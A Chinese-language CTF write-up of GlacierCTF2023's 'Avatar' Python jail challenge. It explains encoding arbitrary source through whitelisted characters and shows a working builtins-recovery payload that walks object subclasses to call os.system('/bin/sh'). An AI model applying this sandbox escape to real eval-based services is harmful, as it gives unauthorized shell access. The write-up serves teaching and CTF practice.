# GlacierCTF2023 - Avatar

## 题目简述

服务执行两层 `eval`，两次都移除了 `__builtins__`。第一层输入还受字符白名单限制，只允许 `gctf{"*+*(=>:/)*+*"}` 中出现的字符；第一层求值结果会被当作第二层 Python 源码再次执行。目标是从受限字符构造任意第二阶段代码并恢复内建函数。

## 解题过程

Python 中 `{ } == { }` 为真，而 `True` 可参与整数运算：

```python
{} == {}                         # True，即 1
({} == {}) + ({} == {})          # 2
f"{(({}=={})+({}=={})):c}"      # 码点 2 对应字符
```

用 1 和 2 按二进制“乘二再加一”构造任意整数，再通过 f-string 的 `:c` 格式转为单字符。对目标第二阶段 payload 的每个字符分别编码，并用 `+` 拼接，整个第一阶段表达式只含白名单字符。

第二阶段虽然没有 builtins，但可以沿 Python 对象图恢复它。遍历 `str` 的基类 `object` 的所有子类，挑出 `__init__.__globals__` 中含 `builtins` 的类，再导入 `os` 执行 shell：

```python
[x.__init__.__globals__
 for x in ''.__class__.__base__.__subclasses__()
 if 'wrapper' not in f'{x.__init__}'
 and 'builtins' in x.__init__.__globals__][0][
    'builtins'
].__import__('os').system('/bin/sh')
```

把上述源码逐字符编码后提交，第二层 `eval` 执行并弹出 shell，读取：

```text
gctf{But_wh3n_th3_w0rld_n33d3d_h1m_m0st_h3_sp4wn3d_4_sh3ll}
```

## 方法总结

双层 `eval` 使第一层字符限制只约束“代码生成器”，而不约束真正执行的第二层源码。空 builtins 也不是隔离边界：只要还能访问 Python 对象模型，就可能从已加载类的全局命名空间恢复导入能力。
